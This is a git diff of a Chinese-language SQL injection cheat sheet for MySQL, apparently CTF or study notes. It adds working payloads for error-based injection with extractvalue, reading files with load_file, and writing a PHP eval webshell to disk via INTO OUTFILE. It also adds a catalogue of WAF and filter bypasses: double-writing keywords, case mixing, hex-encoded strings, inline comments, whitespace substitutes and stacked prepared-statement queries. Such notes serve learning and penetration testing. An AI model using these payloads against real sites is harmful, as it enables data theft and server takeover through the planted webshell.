@@ -278,6 +278,12 @@ update注入就常用updatexml函数来注入：
 id=-1' or updatexml(1, concat(0x7e, version(), 0x7e), 1) -- -
 ```
 
+#### 3. extractvalue报错注入
+
+```
+1' and extractvalue(1,concat(0x7e,database(),0x7e)) -- -
+```
+
 
 
 ## 0x07 宽字节注入
@@ -364,7 +370,7 @@ id=1'^'1
 
 
 
-## 0x09 HTTP头注入
+## 0x0a HTTP头注入
 
 ####  1. 注入类型
 
@@ -443,28 +449,169 @@ sqlmap -u "http://xxx.com/xxx.php" --form
 
 
 
-## 0x0a load_file文件读取
+## 0x0b load_file文件读取
+
 直接load_file导入文件内容
 
 ```
-id=-1' union select 1, load_file('E:\flag.txt'),3 --+  
+id=-1' union select 1, load_file('E:\flag.txt'),3 -- -
 ```
 
-本地调试的时候可以在my.ini中添加这句话[mysqld]port=3306basedir=D:/php/phpStudy_64/phpstudy_pro/Extensions/MySQL5.7.26/datadir=D:/php/phpStudy_64/phpstudy_pro/Extensions/MySQL5.7.26/data/character-set-server=utf8default-storage-engine=MyIsam#支持INNODB引擎模式。修改为default-storage-engine=INNODB即可。#如果INNODB模式如果不能启动，删除data目录下ib开头的日志文件重新启动。secure_file_priv=         #就是这一句！！！！！max_connections=100collation-server=utf8_unicode_ciinit_connect='SET NAMES utf8'innodb_buffer_pool_size=64Minnodb_flush_log_at_trx_commit=1然后保存重启mysql，进入mysql命令行之后，可以输入以下命令查询show global variables 
+想要load_file函数可以使用需要配置一下，在my.ini中添加这句话`secure_file_priv= `：
+
+```ini
+[mysqld]
+port=3306
+basedir=D:/php/phpStudy_64/phpstudy_pro/Extensions/MySQL5.7.26/
+datadir=D:/php/phpStudy_64/phpstudy_pro/Extensions/MySQL5.7.26/data/
+character-set-server=utf8
+default-storage-engine=MyIsam
+#支持INNODB引擎模式。修改为default-storage-engine=INNODB即可。
+#如果INNODB模式如果不能启动，删除data目录下ib开头的日志文件重新启动。
+secure_file_priv=         #就是这一句！！！！！
+max_connections=100
+collation-server=utf8_unicode_ci
+init_connect='SET NAMES utf8'
+innodb_buffer_pool_size=64M
+innodb_flush_log_at_trx_commit=1
+```
+
+然后保存重启mysql，进入mysql命令行之后，可以输入以下命令查询：
+
+```mysql
+show global variables\G;
+```
 
 
 
+## 0x0c outfile写入文件 
 
-## 0xfe 绕过
+首先需要确认数据库开启了写入文件的功能，先在mysql命令行中查询一下general_log是否开启，没有的话输入`set global general_log=on;`设置开启。
 
-1. 内联注释
+```mysql
+mysql> show global variables like "general_log";
++---------------+-------+
+| Variable_name | Value |
++---------------+-------+
+| general_log  | OFF  |
++---------------+-------+
+1 row in set, 1 warning (0.01 sec)
+mysql> set global general_log=on;
+Query OK, 0 rows affected (0.02 sec)
+mysql> show global variables like "general_log";
++---------------+-------+
+| Variable_name | Value |
++---------------+-------+
+| general_log  | ON  |
++---------------+-------+
+1 row in set, 1 warning (0.01 sec)
+mysql>
+```
 
-   select * from [table] where id=1 /* hello */ and 1;随便写的一句，内联注释通常可以绕过WAF。
+然后才能进行写入到文件中，下面是将内容<?php phpinfo();?>写入到文件E:\\\\1.php。注意windows系统下路径中一定要用双反斜杠。
+
+```
+id=-1' union select 1, '<?php phpinfo();?>', 3 into outfile 'E:\\1.php' -- -  
+```
+
+写入webshell：
+
+```
+id=-1' union select 1,'<?php @eval($_POST['x']);?>',3 into outfile 'E:\\1.php' -- -
+```
+
+
+
+## 0x0d 绕过技巧
+
+#### 1. 双写绕过
+
+```
+seleselectct、uniunionon、oorr等
+```
+
+#### 2. 大小写绕过
+
+```
+UniON、SelEct、Or、aNd等
+```
+
+#### 3. 编码绕过
+
+有时候会过滤单引号、双引号，那就可以对需要引号包含起来的内容，进行十六进制编码，编码后就不需要引号了。
+
+```
+'admin' -> 0x61646d696e
+例如
+id=-1 and union select 1,password from users where username=0x61646d696e -- -
+```
+
+#### 4. 内联注释绕过
+
+内联注释就是把注释内容当做sql语句执行，通常可以绕过WAF。
+
+```
+id=-1 and /*! union */ /*! select */ * from [table] where id=1 -- -
+```
+
+#### 5. 绕过注释符过滤
+
+在最后用单引号直接闭合或者用or '1'='1来代替注释符--+、-- 、#。
+
+#### 6. 绕过and和or过滤
+
+- 大小写绕过：or, OR, oR, Or, And, ANd, aND等。
+
+- 注释绕过：在敏感词中间添加注释，a/\*\*/nd。
+- 双写绕过：oorr。
+- 利用符号替代：and用\&\&替代，or用\|\|替代
+
+#### 7. 绕过空格过滤
+
+- %0a 换行符代替空格
+
+- %09 tab键代替空格
+
+- %20 空格，url编码代替直接空格
+
+- %0c 新的一页代替空格
+
+- %0d return功能%0b TAB键（垂直）
+
+#### 8. 绕过select、union关键词过滤
+
+- 大小写绕过
+
+- 双写绕过
+
+- 堆叠注入+预编译+concat字符拼接
+
+```mysql
+id=1';set @sql=concat('s','elect * from `db`');PREPARE pre FROM @sql;EXECUTE pre; -- -
+```
+
+注意：表名为数字时用反引号变为字符串，加上保险一点
+
+
 
 
 
 ## 0xff 其他小技巧
 
 1. 辅助字符帮助查看
-`select * from information_schema limit 20\G;`
-limit 20 是限制了只取20条记录，\\G转化成容易看的形式。
+    `select * from information_schema limit 20\G;`
+    limit 20 是限制了只取20条记录，\\G转化成容易看的形式。
+
+2. **MySQL基础知识
+
+  MySQL中的大小写不敏感，大写与小写一样
+
+  MySQL中的十六进制与URL编码与其原来的语句含义一样，可以直接代替
+
+  符号和关键字替换and等价于\&\&、or等价于\|\|
+
+  内联注释： /\*! 内联注释 \*/
+
+  单行注释：--+或--空格 或#
+
+  多行注释：/\* 多行注释内容 \*/
